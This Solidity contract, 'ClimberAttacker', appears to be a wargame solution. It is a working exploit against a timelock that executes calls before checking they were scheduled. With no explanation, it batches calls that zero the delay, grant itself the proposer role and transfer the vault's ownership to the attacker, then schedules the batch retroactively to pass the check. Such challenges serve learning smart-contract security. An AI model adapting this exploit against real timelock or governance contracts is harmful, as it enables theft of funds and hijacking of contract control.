// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
}

contract ClimberAttacker {
    address payable private immutable timelock;

    uint256[] private values = [0, 0, 0, 0];
    address[] private targets = new address[](4);
    bytes[] private elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        targets = [timelock, timelock, _vault, address(this)];

        elements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        elements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));        
        elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        elements[3] = abi.encodeWithSignature("schedule()");
    }

    function attack() external {
        IClimberTimelock(timelock).execute(targets, values, elements, bytes32("anySalt"));
    }

    function schedule() external {
        IClimberTimelock(timelock).schedule(targets, values, elements, bytes32("anySalt"));
    }
}